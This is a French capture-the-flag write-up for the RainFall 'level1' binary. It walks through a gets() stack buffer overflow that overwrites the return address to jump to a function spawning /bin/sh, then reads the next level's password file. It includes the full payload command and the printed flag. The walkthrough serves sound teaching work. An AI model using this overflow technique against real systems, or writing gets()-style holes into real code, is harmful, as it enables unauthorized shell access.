# Level1: Exploitation de gets() pour Obtenir un Shell Non Autorisé

## Analyse du Binaire

Le programme level1 contient une vulnérabilité simple de dépassement de tampon. En examinant le code source:

```c
#include <stdio.h>

int main(void)
{
  /* Buffer de 76 octets alloué sur la pile */
  char buffer[76];

  /* gets() lit l'entrée utilisateur sans vérification de taille */
  gets(buffer);

  return 0;
}

void run(void)
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
  return;
}
```

La vulnérabilité principale est l'utilisation de `gets()`, qui lit l'entrée utilisateur sans aucune limitation de taille dans un buffer de taille fixe.

## Explication de la Vulnérabilité

Cela crée une vulnérabilité de dépassement de tampon (buffer overflow) car:

1. Le tableau `buffer` ne fait que 76 octets de long
2. `gets()` continuera de lire des données au-delà de ces 76 octets
3. Les données dépassant le buffer écraseront la mémoire adjacente sur la pile
4. Cela inclut l'écrasement de l'adresse de retour, permettant de détourner le flux d'exécution du programme

## Localisation de la Fonction Cible

D'abord, nous utilisons GDB pour trouver l'adresse mémoire de la fonction `run()`:

```bash
level1@RainFall:~$ gdb -q ./level1
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Nous découvrons que `run()` est située à l'adresse `0x8048444`. Cette fonction sera notre cible car elle appelle `system("/bin/sh")`.

## Élaboration de l'Exploit

Notre exploit doit:

1. Remplir le buffer de 76 octets
2. Écraser l'adresse de retour avec l'adresse de la fonction `run()`

### Comprendre le Format Little-Endian

Sur l'architecture x86 (utilisée par ce binaire), les adresses mémoire sont stockées au format little-endian. Cela signifie que l'octet le moins significatif est stocké à l'adresse mémoire la plus basse.

Pour notre adresse `0x08048444`:

- En big-endian: `08 04 84 44`
- En little-endian: `44 84 04 08`

Nous devons utiliser le format little-endian dans notre payload car c'est ainsi que le processeur interprétera les octets lors de la lecture de l'adresse de retour depuis la pile.

### Construction de la Commande d'Exploit

```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

Décortiquons cette commande:

- `python -c '...'`: L'option `-c` permet d'exécuter du code Python directement depuis la ligne de commande
- `print "A"*76`: Crée 76 caractères 'A' pour remplir le buffer
- `"\x44\x84\x04\x08"`: La représentation little-endian de l'adresse de la fonction `run()`
- `cat` sans arguments: Maintient stdin ouvert après l'envoi de notre payload
- Redirection vers `./level1`: Alimente notre payload vers l'entrée standard du programme

### Pourquoi Nous Avons Besoin de `cat`

La commande `cat` est cruciale car:

1. Lorsque l'exploit réussit et que `system("/bin/sh")` s'exécute, le shell a besoin d'une entrée standard ouverte pour recevoir des commandes
2. Sans `cat`, stdin se fermerait après l'envoi de l'exploit, provoquant la fermeture immédiate du shell
3. Avec `cat`, stdin reste ouvert, nous permettant d'interagir avec le shell généré

## Exploitation Réussie

Lorsque nous exécutons notre exploit:

```bash
level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
```

Nous voyons le message de la fonction `run()`, confirmant que notre exploit a fonctionné. Maintenant, nous pouvons récupérer le mot de passe:

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Ce mot de passe nous permet de passer au niveau 2.
